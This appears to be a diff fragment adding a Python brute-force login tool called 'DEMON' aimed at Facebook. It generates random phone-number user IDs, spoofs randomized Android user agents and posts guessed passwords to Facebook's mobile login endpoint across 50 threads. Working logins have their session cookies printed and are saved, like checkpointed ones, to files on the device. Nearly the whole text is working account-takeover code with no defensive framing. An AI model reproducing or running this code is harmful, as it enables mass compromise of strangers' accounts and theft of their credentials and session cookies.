+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+    
+def dmn():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f' [{xr}+{x}] Example>: {xr}019,017,018,016,014,013{x}')
+    print(" ════════════════════════════════════════")
+    code = input(f' [{xr}?{x}] Choose : ')
+    os.system('clear')
+    print(logo)
+    limit = int(input(f'\033[0;97m[{xr}+{x}]\033[0;92m EXAMPLE : \033[0;93m2000, 5000, 10000, 50000 \n\033[1;92m════════════════════════════════════════ \n\033[0;97m[{xr}?{x}] \033[0;92mPUT LIMIT:\033[0;93m '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    passx = 0
+    HamiiID = []
+    print("")
+    for bilal in range(passx):
+        pww = input(f"[*] Enter Password {bilal+1} : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        jalan('\033[1;97m════════════════════════════════════════')
+        jalan(f'[{xr}+{x}]\033[1;92m TOTAL IDS : '+tl)
+        jalan(f'\033[0;97m[{xr}+{x}]\033[0;92m USE MOBILE DATA ONLY ')
+        jalan(f'\033[0;97m[{xr}+{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+        jalan('\033[1;97m════════════════════════════════════════')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+                pwx.append(love)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(f"\n{x} ════════════════════════════════════════")
+def rcrack(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m[DEMON-OK💉] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎❤]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                cek_apk(session,coki)
+                open('/sdcard/DEMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\r\r\33[1;30m[DEMON-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/DEMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\r%s{x}[{xr}DEMON{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+
+DEMON()
